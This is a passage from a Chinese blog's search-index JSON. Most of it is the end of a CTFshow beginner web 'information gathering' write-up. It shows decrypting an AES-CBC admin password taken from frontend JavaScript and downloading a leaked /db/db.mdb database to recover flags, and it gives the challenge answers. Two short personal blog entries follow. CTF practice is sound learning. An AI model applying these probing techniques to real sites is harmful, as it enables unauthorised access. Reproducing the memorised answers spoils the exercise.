encrypt(data,key,iv) { //key,iv：16位的字符串 var key1 = CryptoJS.enc.Latin1.parse(key); var iv1 = CryptoJS.enc.Latin1.parse(iv); return CryptoJS.AES.encrypt(data, key1,{ iv : iv1, mode : CryptoJS.mode.CBC, padding : CryptoJS.pad.ZeroPadding }).toString(); } 还给了验证的密钥\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); $flag=\u0026#34;fakeflag\u0026#34; $u = $_POST[\u0026#39;username\u0026#39;]; $p = $_POST[\u0026#39;pazzword\u0026#39;]; if(isset($u) \u0026amp;\u0026amp; isset($p)){ if($u===\u0026#39;admin\u0026#39; \u0026amp;\u0026amp; $p ===\u0026#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04\u0026#39;){ echo $flag; } } 根据收集到的信息搜索AES加密，使用这个网站，从上面前端的JS中找到相关方法：CBC ZeroPadding，再根据密文解密出密码：i_want_a_36d_girl\n直接提交账号和密码admin i_want_a_36d_girl获取flag\nWEB20 mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。\n根据提示搜索相关信息，可以搜到/db/db.mdb，尝试下载后使用access打开，虽然报了一堆错，但是最后还是找到了flag\nflag{ctfshow_old_database}\n","date":"2024-11-06T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_informationcollect_write_up/","title":"CTF_show Web入门 信息收集writeup WEB1-WEB20"},{"content":"新人第一次比赛的writeup，可能写的有很啰嗦的地方，请高手们见谅呀QAQ\n因为直接上传太大了，访问效果不佳，所以这里直接提供原始文档\nBuildCTF官方图片 点击此处查看\n","date":"2024-10-31T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/build_ctf_write_up/","title":"从BuildCTF开始——CTF的旅程"},{"content":" 随着前两个博客分别因为 没续费和rm -rf 相继暴毙以后，第三个又双叒叕来啦！！\n嗯 有点不吉利\n","date":"2024-10-31T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/new_start_first_blog/","title":"第一篇博客"}]